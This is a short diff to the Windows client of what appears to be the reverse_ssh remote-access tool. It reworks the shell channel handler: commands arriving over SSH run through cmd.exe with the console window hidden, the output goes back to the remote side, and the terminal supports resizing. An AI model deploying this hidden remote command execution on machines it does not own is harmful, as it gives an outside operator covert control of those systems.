@@ -2,12 +2,13 @@
 package client
 
 import (
-	"bufio"
 	"fmt"
 	"log"
 	"os/exec"
 	"syscall"
 
+	"github.com/NHAS/reverse_ssh/internal"
+	"github.com/NHAS/reverse_ssh/internal/server/terminal"
 	"golang.org/x/crypto/ssh"
 )
 
@@ -23,24 +24,25 @@ func shellChannel(sshConn ssh.Conn, newChannel ssh.NewChannel) {
 	}
 	defer connection.Close()
 
+	term := terminal.NewTerminal(connection, ">")
 	go func() {
 		defer connection.Close()
-		r := bufio.NewReader(connection)
+
 		for {
-			fmt.Fprintf(connection, "\n> ")
-			order, err := r.ReadString('\n')
+
+			order, err := term.ReadLine()
 			if nil != err {
 				return
 			}
 
-			cmd := exec.Command("cmd", "/C", order)
+			cmd := exec.Command("cmd.exe", "/C", order)
 			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 			out, err := cmd.CombinedOutput()
 			if err != nil {
 				out = []byte(fmt.Sprintf("Unable to execute command. Reason: %s", err))
 			}
 
-			fmt.Fprintf(connection, "%s", out)
+			_, err = fmt.Fprintf(connection, "%s", out)
 			if err != nil {
 				log.Println("Unable to write: ", err)
 				return
@@ -57,7 +59,8 @@ func shellChannel(sshConn ssh.Conn, newChannel ssh.NewChannel) {
 			req.Reply(len(req.Payload) == 0, nil)
 
 		case "window-change":
-			req.Reply(true, nil)
+			w, h := internal.ParseDims(req.Payload)
+			term.SetSize(int(w), int(h))
 
 		case "pty-req":
 			req.Reply(true, nil)
